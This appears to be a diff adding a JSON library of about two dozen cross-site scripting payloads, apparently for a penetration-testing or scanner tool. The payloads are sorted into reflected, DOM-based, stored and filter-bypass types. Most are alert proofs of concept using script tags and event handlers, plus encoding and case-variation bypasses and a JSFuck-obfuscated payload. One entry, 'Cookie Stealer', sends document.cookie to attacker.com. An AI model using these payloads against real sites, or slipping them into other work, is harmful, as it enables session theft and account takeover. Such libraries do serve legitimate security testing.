@@ -1,0 +1,467 @@
+{
+    "category": "XSS",
+    "description": "Cross-Site Scripting payloads for various contexts and bypass techniques",
+    "payloads": [
+        {
+            "id": "xss-reflected-001",
+            "title": "Basic Alert",
+            "payload": "<script>alert(1)</script>",
+            "category": "XSS",
+            "subcategory": "Reflected",
+            "context": [
+                "html",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "reflected",
+                "script"
+            ],
+            "notes": "Most basic XSS payload, often filtered",
+            "source": "github"
+        },
+        {
+            "id": "xss-reflected-002",
+            "title": "Alert with Document Domain",
+            "payload": "<script>alert(document.domain)</script>",
+            "category": "XSS",
+            "subcategory": "Reflected",
+            "context": [
+                "html",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "reflected",
+                "domain"
+            ],
+            "notes": "Shows current domain - useful for PoC",
+            "source": "github"
+        },
+        {
+            "id": "xss-reflected-003",
+            "title": "Alert with Cookie",
+            "payload": "<script>alert(document.cookie)</script>",
+            "category": "XSS",
+            "subcategory": "Reflected",
+            "context": [
+                "html",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "reflected",
+                "cookie"
+            ],
+            "notes": "Displays cookies - test for cookie stealing",
+            "source": "github"
+        },
+        {
+            "id": "xss-reflected-004",
+            "title": "IMG Onerror",
+            "payload": "<img src=x onerror=alert(1)>",
+            "category": "XSS",
+            "subcategory": "Reflected",
+            "context": [
+                "html",
+                "attribute"
+            ],
+            "level": "low",
+            "tags": [
+                "img",
+                "onerror",
+                "event"
+            ],
+            "notes": "Bypass script tag filters",
+            "source": "github"
+        },
+        {
+            "id": "xss-reflected-005",
+            "title": "SVG Onload",
+            "payload": "<svg onload=alert(1)>",
+            "category": "XSS",
+            "subcategory": "Reflected",
+            "context": [
+                "html"
+            ],
+            "level": "low",
+            "tags": [
+                "svg",
+                "onload",
+                "event"
+            ],
+            "notes": "SVG-based XSS, often bypasses filters",
+            "source": "github"
+        },
+        {
+            "id": "xss-reflected-006",
+            "title": "Body Onload",
+            "payload": "<body onload=alert(1)>",
+            "category": "XSS",
+            "subcategory": "Reflected",
+            "context": [
+                "html"
+            ],
+            "level": "low",
+            "tags": [
+                "body",
+                "onload",
+                "event"
+            ],
+            "notes": "Requires injection at body context",
+            "source": "github"
+        },
+        {
+            "id": "xss-reflected-007",
+            "title": "Input Onfocus Autofocus",
+            "payload": "<input onfocus=alert(1) autofocus>",
+            "category": "XSS",
+            "subcategory": "Reflected",
+            "context": [
+                "html",
+                "form"
+            ],
+            "level": "medium",
+            "tags": [
+                "input",
+                "onfocus",
+                "autofocus"
+            ],
+            "notes": "Auto-triggers without user interaction",
+            "source": "github"
+        },
+        {
+            "id": "xss-reflected-008",
+            "title": "Marquee Onstart",
+            "payload": "<marquee onstart=alert(1)>",
+            "category": "XSS",
+            "subcategory": "Reflected",
+            "context": [
+                "html"
+            ],
+            "level": "medium",
+            "tags": [
+                "marquee",
+                "onstart",
+                "event"
+            ],
+            "notes": "Less commonly filtered",
+            "source": "github"
+        },
+        {
+            "id": "xss-reflected-009",
+            "title": "Details Ontoggle",
+            "payload": "<details open ontoggle=alert(1)>",
+            "category": "XSS",
+            "subcategory": "Reflected",
+            "context": [
+                "html"
+            ],
+            "level": "medium",
+            "tags": [
+                "details",
+                "ontoggle",
+                "html5"
+            ],
+            "notes": "HTML5 element, often bypasses legacy filters",
+            "source": "github"
+        },
+        {
+            "id": "xss-reflected-010",
+            "title": "Video Onerror",
+            "payload": "<video><source onerror=alert(1)>",
+            "category": "XSS",
+            "subcategory": "Reflected",
+            "context": [
+                "html"
+            ],
+            "level": "medium",
+            "tags": [
+                "video",
+                "source",
+                "onerror"
+            ],
+            "notes": "Media element XSS",
+            "source": "github"
+        },
+        {
+            "id": "xss-dom-001",
+            "title": "Location Hash",
+            "payload": "<script>eval(location.hash.slice(1))</script>",
+            "category": "XSS",
+            "subcategory": "DOM-based",
+            "context": [
+                "html",
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "dom",
+                "location",
+                "hash"
+            ],
+            "notes": "DOM-based XSS via URL fragment",
+            "source": "github"
+        },
+        {
+            "id": "xss-dom-002",
+            "title": "Document Write",
+            "payload": "<script>document.write('<img src=x onerror=alert(1)>')</script>",
+            "category": "XSS",
+            "subcategory": "DOM-based",
+            "context": [
+                "html"
+            ],
+            "level": "medium",
+            "tags": [
+                "dom",
+                "document.write"
+            ],
+            "notes": "DOM manipulation XSS",
+            "source": "github"
+        },
+        {
+            "id": "xss-dom-003",
+            "title": "InnerHTML",
+            "payload": "<img src=x onerror=this.parentNode.innerHTML='pwned'>",
+            "category": "XSS",
+            "subcategory": "DOM-based",
+            "context": [
+                "html"
+            ],
+            "level": "medium",
+            "tags": [
+                "dom",
+                "innerHTML",
+                "img"
+            ],
+            "notes": "Modifies DOM after execution",
+            "source": "github"
+        },
+        {
+            "id": "xss-stored-001",
+            "title": "Persistent Alert",
+            "payload": "<script>alert('Stored XSS')</script>",
+            "category": "XSS",
+            "subcategory": "Stored",
+            "context": [
+                "html",
+                "comment",
+                "profile"
+            ],
+            "level": "high",
+            "tags": [
+                "stored",
+                "persistent",
+                "script"
+            ],
+            "notes": "For stored XSS testing in comments/profiles",
+            "source": "github"
+        },
+        {
+            "id": "xss-stored-002",
+            "title": "Cookie Stealer",
+            "payload": "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>",
+            "category": "XSS",
+            "subcategory": "Stored",
+            "context": [
+                "html"
+            ],
+            "level": "high",
+            "tags": [
+                "stored",
+                "cookie",
+                "exfil"
+            ],
+            "notes": "Exfiltrates cookies to attacker server",
+            "source": "github"
+        },
+        {
+            "id": "xss-bypass-001",
+            "title": "Case Variation",
+            "payload": "<ScRiPt>alert(1)</ScRiPt>",
+            "category": "XSS",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "html"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "case",
+                "filter"
+            ],
+            "notes": "Bypasses case-sensitive filters",
+            "source": "github"
+        },
+        {
+            "id": "xss-bypass-002",
+            "title": "Double Encoding",
+            "payload": "%253Cscript%253Ealert(1)%253C/script%253E",
+            "category": "XSS",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "encoding",
+                "double"
+            ],
+            "notes": "Double URL encoding bypass",
+            "source": "github"
+        },
+        {
+            "id": "xss-bypass-003",
+            "title": "Null Byte",
+            "payload": "<scr%00ipt>alert(1)</scr%00ipt>",
+            "category": "XSS",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "html"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "null",
+                "filter"
+            ],
+            "notes": "Null byte injection",
+            "source": "github"
+        },
+        {
+            "id": "xss-bypass-004",
+            "title": "JavaScript Protocol",
+            "payload": "javascript:alert(1)",
+            "category": "XSS",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url",
+                "href"
+            ],
+            "level": "low",
+            "tags": [
+                "bypass",
+                "javascript",
+                "protocol"
+            ],
+            "notes": "For href/src attributes",
+            "source": "github"
+        },
+        {
+            "id": "xss-bypass-005",
+            "title": "Data URI",
+            "payload": "data:text/html,<script>alert(1)</script>",
+            "category": "XSS",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url",
+                "iframe"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "data",
+                "uri"
+            ],
+            "notes": "Data URI scheme for iframes",
+            "source": "github"
+        },
+        {
+            "id": "xss-bypass-006",
+            "title": "SVG with CDATA",
+            "payload": "<svg><![CDATA[><script>alert(1)</script>]]></svg>",
+            "category": "XSS",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "html",
+                "xml"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "svg",
+                "cdata"
+            ],
+            "notes": "CDATA bypass in SVG context",
+            "source": "github"
+        },
+        {
+            "id": "xss-bypass-007",
+            "title": "Template Literal",
+            "payload": "<script>alert`1`</script>",
+            "category": "XSS",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "html"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "template",
+                "backtick"
+            ],
+            "notes": "Uses template literals instead of parentheses",
+            "source": "github"
+        },
+        {
+            "id": "xss-bypass-008",
+            "title": "Unicode Escape",
+            "payload": "<script>\\u0061lert(1)</script>",
+            "category": "XSS",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "html"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "unicode",
+                "escape"
+            ],
+            "notes": "Unicode escape sequences",
+            "source": "github"
+        },
+        {
+            "id": "xss-bypass-009",
+            "title": "HTML Entity Bypass",
+            "payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+            "category": "XSS",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "html"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "entity",
+                "html"
+            ],
+            "notes": "HTML entity encoding",
+            "source": "github"
+        },
+        {
+            "id": "xss-bypass-010",
+            "title": "JSFuck Alert",
+            "payload": "[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]+[+!+[]]]+(![]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]+[+!+[]]]+(![]+[])[+[]]+(![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+[![]]+[+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]])())()",
+            "category": "XSS",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "html"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "jsfuck",
+                "obfuscation"
+            ],
+            "notes": "JSFuck obfuscated alert - extreme bypass",
+            "source": "github"
+        }
+    ]
+}
